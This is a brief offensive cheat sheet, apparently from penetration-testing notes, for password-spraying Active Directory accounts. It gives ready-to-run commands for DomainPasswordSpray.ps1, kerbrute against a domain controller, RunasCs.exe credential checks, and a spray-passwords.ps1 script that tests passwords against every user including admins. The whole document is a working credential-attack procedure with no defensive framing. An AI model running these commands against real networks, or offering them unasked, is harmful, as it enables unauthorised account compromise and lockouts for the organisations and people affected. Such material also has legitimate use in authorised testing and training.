### **USING DOMAINPASSWORDSPRAY.PS1**

1.  Import the DomainPasswordSpray module.  
    `Import-Module .\DomainPasswordSpray.ps1`
2.  Run the Invoke-DomainPasswordSpray command with the desired password and output file parameters.  
    `Invoke-DomainPasswordSpray -Password [PASSWORD] -OutFile spray_success -ErrorAction SilentlyContinue`

### **USING KERBRUTE FOR PASSWORD SPRAYING**

1.  Execute the password spray attack:  
    `kerbrute passwordspray -d example.local --dc [IP_ADDRESS] valid_users.txt [PASSWORD]`

### **USING RUNASCS.EXE**

1.  RunasCs.exe can be used to check credentials locally without access to SMB, LDAP, WinRM, Kerberos, or any other authenticated Windows services.  
    `.\RunasCs.exe Administrator notthepassword "cmd /c whoami"`
    
2.  Use spray-passwords.ps1 script: https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
    
    ```powershell
    # test password against all users in the AD, including admins.
    PS> .\spray-passwords.ps1 -Admin -Pass IamUser01
    PS> .\spray-passwords.ps1 -Admin -Pass IamUser02
    ```